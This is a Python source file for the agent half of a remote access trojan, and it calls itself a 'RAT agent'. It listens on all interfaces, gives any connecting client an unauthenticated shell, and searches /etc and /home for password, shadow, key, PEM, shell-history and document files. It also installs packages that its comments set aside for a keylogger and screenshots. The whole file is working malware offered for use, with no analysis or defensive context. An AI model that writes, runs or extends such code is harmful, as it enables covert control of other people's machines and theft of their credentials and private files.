# agent.py
import socket
import subprocess
import threading
import os
import sys

HOST = '0.0.0.0'   # Listen on all interfaces
PORT = 5555        # Use the same port in controller.py

# Define the packages we'll need later (for screenshot, keylogger, etc.)
REQUIRED_PACKAGES = ['pynput', 'pyautogui', 'Pillow']

def install_missing_packages():
    """
    Automatically install required packages using pip.
    This runs only once at startup.
    """
    try:
        for package in REQUIRED_PACKAGES:
            try:
                __import__(package)
            except ImportError:
                print(f"[!] Installing missing package: {package}")
                subprocess.call([sys.executable, "-m", "pip", "install", package])
    except Exception as e:
        print(f"[!] Package installation error: {e}")

def execute_shell_command(cmd):
    """
    Executes a shell command and returns its output.
    """
    try:
        result = subprocess.getoutput(cmd)
        return result
    except Exception as e:
        return f"[ERROR executing command]: {e}"

def search_files():
    """
    Recursively searches for sensitive files across common directories.
    Returns a formatted string with found file paths.
    """
    search_dirs = ['/etc', '/home']
    keywords = ['passwd', 'shadow', '.conf', '.key', '.pem', '.bash_history', '.docx', '.pdf', '.txt']
    matches = []

    try:
        for dir_path in search_dirs:
            for root, dirs, files in os.walk(dir_path):
                for file in files:
                    for keyword in keywords:
                        if keyword in file.lower():
                            full_path = os.path.join(root, file)
                            matches.append(full_path)
        if matches:
            return "\n".join(matches)
        else:
            return "[*] No matching files found."
    except Exception as e:
        return f"[ERROR during file search]: {e}"

def handle_command(cmd):
    """
    Routes commands to the correct function.
    """
    cmd = cmd.strip().lower()

    if cmd == "search files":
        return search_files()

    else:
        return execute_shell_command(cmd)

def handle_client(client_socket):
    client_socket.send(b"[*] Connected to RAT agent.\nAvailable commands:\n- search files\n- any shell command (ls, whoami, etc)\n- exit\n")

    while True:
        try:
            client_socket.send(b"\nShell> ")
            cmd = client_socket.recv(4096).decode()

            if not cmd:
                continue
            if cmd.strip().lower() == "exit":
                break

            result = handle_command(cmd)
            client_socket.send(result.encode())
        except Exception as e:
            error_msg = f"[Exception] {e}"
            client_socket.send(error_msg.encode())
            break

    client_socket.close()

def main():
    install_missing_packages()

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(1)
    print(f"[+] Listening on {HOST}:{PORT}...")

    while True:
        client_sock, addr = server.accept()
        print(f"[+] Connection from {addr[0]}:{addr[1]}")
        client_thread = threading.Thread(target=handle_client, args=(client_sock,))
        client_thread.start()

if __name__ == "__main__":
    main()
